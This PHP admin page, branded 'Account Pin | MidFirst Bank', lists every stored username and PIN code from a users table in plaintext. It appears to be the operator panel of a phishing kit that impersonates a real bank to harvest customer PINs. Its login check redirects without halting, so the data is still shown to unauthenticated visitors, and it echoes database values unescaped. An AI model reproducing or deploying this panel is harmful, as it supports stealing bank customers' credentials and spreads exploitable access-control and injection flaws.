<?php 
require('../functions.php');

if (!isAdmin()) {
	$_SESSION['msg'] = "You must log in first";
	header('location: ../login.php');
}

if (isset($_GET['logout'])) {
	session_destroy();
	unset($_SESSION['user']);
	header("location: ../login.php");
}
?>
<!DOCTYPE HTML>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <head>
        <!-- Meta Tags -->
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	<meta name="HandheldFriendly" content="true" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
	<title>Account Pin | MidFirst Bank</title>
    <style>
body,html{margin:0;padding:0;background-color:#696969;}
a{
 text-decoration: none;}
            body{font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;backgrond:#fff;max-width:750px;margin:auto;}
            .head{border-radius: 5px;box-shadow: 0px 1px 0px 1px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width:auto;}
            .foot{right:0; left: 0;
  bottom: 0;position: absolute;box-shadow: 2px 2px 0px 2px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width: 100%;}
            .button{background-color: #222;
  color: #696969;
  padding: 12px;
  border-radius: 5px;
  font-weight:bold;
  font-size:17px;
  border:1px solid #000;
  width: 100%;}
            .text{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;color:#ffffff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mtext{text-shadow: 1px 0px 2px #000;font-size:13px;margin:15px;color:#fff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mybox{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;padding:10px;border-radius:5px;border:1px solid #000;background-color:#ffffff;font-family:lato,sans-serif;}
            .input-group {
 margin: 5px 13px 5px 1px; } .input-group label { display: block;
 text-align: left; margin: 3px;} .input-group input { box-shadow: rgba(0,0,0,0.3) 0 0 10px;
 border-collapse: collapse; height: 25px;
 padding: 5px;
 width: 100%;
 font-size: 16px;
 border-radius: 5px; border: 1px solid #222; background:#fff;
 }
 .btn {
 padding: 10px;
 width:auto;
 font-size: 15px;
 color: #000;
 background: #696969;border-radius: 5px; }
 .admin-content{
 margin: 5px ;
 border-radius:3px;
 padding: 0px 4px 0px 0px; border: 1px solid #222; background: #fff; color:#000;
 }
 .adminnav{
 font-size:15px;
 font-weight:bold; background:#222; color:white;
 padding:4px;
 magin:2px;} .myheader {
 width: 40%;
 padding: 10px; color: white;
 background: #5F9EA0; text-align: center; border: 1px solid #B0C4DE; border-bottom: none; border-radius: 10px 10px 0px 0px; padding: 20px;
 }
 table a{color:#222;font-weight:bold;}
 table {
margin:2px;
border:1px solid #222;
border-radius:3px;
color: #000000;
font-family: lato, sans-serif;
font-size: 16px;
text-align: center;
}
th {
background-color: #222;
margin:5px;
color: #ffffff;
border:2px solid brown;
padding:1px;
text-align: center;
}
tr td:nth-child(even) {border-radius:1px;border: 1px solid #e3d0d6;background-color: #fff;}
td:nth-child(odd) {border-radius:2px;padding:5px;border: 2px solid #222;background-color: #fff;}
</style>
</head>
<body>
<?php include('../header.php'); ?>

<div align="center"></div><table width="auto"><tbody><tr><td><a href="home.php">GO Back Home</a></td></tr></tbody></table></div>

<div align="center" class="admin-content">
    <table width="100%">
<tbody>
<th>User ID</th>
<th>PIN Code</th>
<th>Action</th>
<?php require "database.php";

// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM users";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["username"]. "</td><td>" . $row["pin"]. "</td><td><a href='edit-account.php?id=" . $row["id"]. "' class='adminnav'>Change</a></td></tr>";
}
echo "</table>";
} else { echo "<div style='margin:2px 1px 2px 5px;padding:3px;border:1px solid #222;background:red;font-weight:bold;text-align:center;color:#fff;'>No Accounts</div>"; }
$conn->close();
?>
</tbody>
</table>
</div>
<?php include('../footer.php'); ?>